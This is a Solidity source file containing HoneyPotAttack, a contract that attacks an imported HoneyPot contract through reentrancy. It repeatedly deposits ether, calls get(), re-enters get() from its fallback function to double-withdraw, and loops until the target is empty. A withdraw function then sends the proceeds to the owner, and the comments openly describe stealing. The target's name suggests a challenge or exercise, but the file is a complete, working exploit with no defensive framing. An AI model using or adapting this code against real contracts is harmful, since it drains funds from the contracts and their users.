pragma solidity ^0.4.18;

import "./Honeypot.sol";

contract HoneyPotAttack {
    HoneyPot public hp;
    address public owner;
    bool inReentry;
    
    event Log(uint256 hpBalance, uint256 myBalance, uint256 gasLeft);

    function HoneyPotAttack(HoneyPot _hp) public payable {
        owner = msg.sender;
        hp = _hp;
    }

    // deposit funds, then get them back, multiple times
    function attack() public {
        require(msg.sender == owner);
        require(this.balance > 0);

        while(hp.balance > 0 && msg.gas > 100000) { // (measured ~75k per round)
            // there is something to steal and we have some gas left
            attack1();
            // Log(hp.balance, this.balance, msg.gas);
        }
    }

    function attack1() private {
        uint256 attackAmount;
        if (hp.balance <= this.balance) {
            // it will be over after one more double-withdrawal
            attackAmount = hp.balance;
        } else {
            attackAmount = this.balance;
        }
        hp.put.value(attackAmount)();
        hp.get();
    }

    function() public payable {
        require(tx.origin == owner); // only owner can start the mess
        if (!inReentry) {
            inReentry = true;
            hp.get();
            inReentry = false;
        }
    }
    
    // attacker calls this to withdraw funds
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(this.balance);
    }

    function getBalance() public view returns (uint256) { return this.balance; }
}

